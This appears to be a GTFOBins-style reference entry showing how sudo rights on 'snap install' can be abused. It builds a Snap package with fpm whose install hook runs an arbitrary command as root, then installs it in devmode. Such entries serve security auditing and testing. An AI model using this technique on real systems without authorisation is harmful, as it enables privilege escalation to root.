---
functions:
  sudo:
    - description: |
        It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        COMMAND=id
        cd $(mktemp -d)
        mkdir -p meta/hooks
        printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
        chmod +x meta/hooks/install
        fpm -n xxxx -s dir -t snap -a all meta
        ```
      code: |
        sudo snap install xxxx_1.0_all.snap --dangerous --devmode
---
